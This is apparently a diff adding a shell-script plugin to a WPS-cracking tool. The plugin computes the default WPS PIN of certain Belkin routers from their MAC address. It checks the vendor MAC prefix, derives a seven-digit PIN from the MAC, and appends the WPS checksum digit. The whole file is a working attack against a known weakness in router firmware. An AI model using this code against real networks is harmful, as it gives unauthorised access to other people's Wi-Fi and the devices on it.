@@ -1,0 +1,30 @@
+#!/bin/sh
+
+cd $(dirname $(readlink -f $0))
+. ./plugin_core
+parse_plugin_args "$@"
+
+if ! check_vendor_mac "$VENDOR_MAC" 002275 001CDF 09863B; then
+  echo "VENDOR MAC $VENDOR_MAC not affected" 
+  exit 1
+fi
+
+calc_belkin(){
+  PRIVATE_MAC=${1}
+  p=$((0x$PRIVATE_MAC % 10000000))
+    wps_pin_checksum(){
+      pin=$1
+      accum=0
+      while [ $pin -ne 0 ];do
+        accum=$((accum + (3 * (pin % 10)) ))
+        pin=$((pin/10))
+        accum=$((accum + pin %10 ))
+        pin=$((pin/10))
+      done
+      echo $(( (10 - accum % 10) % 10))
+    }
+  printf "%07d%d" $p $(wps_pin_checksum $p)
+  return 0
+}
+
+printf "WPS-PIN: %s" $(calc_belkin ${PRIVATE_MAC})
